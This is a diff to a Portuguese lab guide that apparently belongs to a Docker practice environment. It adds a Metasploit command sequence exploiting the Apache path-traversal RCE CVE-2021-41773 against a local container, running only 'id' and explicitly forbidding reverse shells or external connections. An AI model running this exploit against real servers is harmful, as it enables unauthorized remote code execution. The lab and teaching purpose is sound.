@@ -223,6 +223,24 @@ testar o módulo relacionado ao Apache. Abra uma console interativa no serviço:
 docker compose exec exploiter msfconsole -q
 ```
 
+Dentro do Metasploit:
+
+```text
+use exploit/multi/http/apache_normalize_path_rce
+set CVE CVE-2021-41773
+set RHOSTS apache
+set RPORT 80
+set SSL false
+set TARGETURI /cgi-bin
+set TARGET 1
+set PAYLOAD cmd/unix/generic
+set CMD id
+set AllowNoCleanup true
+check
+run
+exit
+```
+
 A prova deve ser limitada a uma informação inofensiva, como a identidade do
 processo (`id`) ou a leitura controlada de um arquivo de teste. Não use payload
 persistente, reverse shell ou conexão externa.
